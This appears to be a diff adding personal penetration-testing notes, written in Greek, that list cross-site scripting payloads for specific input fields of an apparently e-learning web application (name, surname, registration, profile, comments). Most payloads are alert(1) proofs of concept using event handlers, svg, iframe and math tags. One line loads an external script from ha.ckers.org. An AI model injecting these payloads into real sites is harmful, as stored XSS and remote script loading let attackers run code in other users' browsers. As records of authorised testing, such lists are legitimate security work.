@@ -1,0 +1,48 @@
+------------------------------------------------------------
+Αλλαγή ονόματος
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+</br style=a:expression(alert())>
+<body onLoad="alert('XSS');"
+'">><marquee><h1>XSS</h1></marquee>
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
+<iframe xmlns="#" src="javascript:alert(1)"></iframe>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+<? foo="><script>javascript:alert(1)</script>">
+------------------------------------------------------------
+
+------------------------------------------------------------
+Αλλαγή Επιθέτου
+<script\x20type="text/javascript">javascript:alert(1);</script>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<body oninput=javascript:alert(1)><input autofocus>
+<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
+
+------------------------------------------------------------
+Spane alla mhn ta trexw!!:
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+------------------------------------------------------------
+
+	
+------------------------------------------------------------
+Εγγραφή Εκπαιδευόμενου
+στο ονομα/επίθετο:
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+------------------------------------------------------------
+Αλλαγή Προφίλ μου	
+Email/ονομα/επώνυμο	
+<svg xmlns="#"><script>alert(1)</script></svg>
+------------------------------------------------------------	
+Τηλεσυνεργασία:
+<svg xmlns="#"><script>alert(1)</script></svg>
+------------------------------------------------------------	
+Εργασία:
+Στα σχόλια
+<svg xmlns="#"><script>alert(1)</script></svg>
+------------------------------------------------------------	
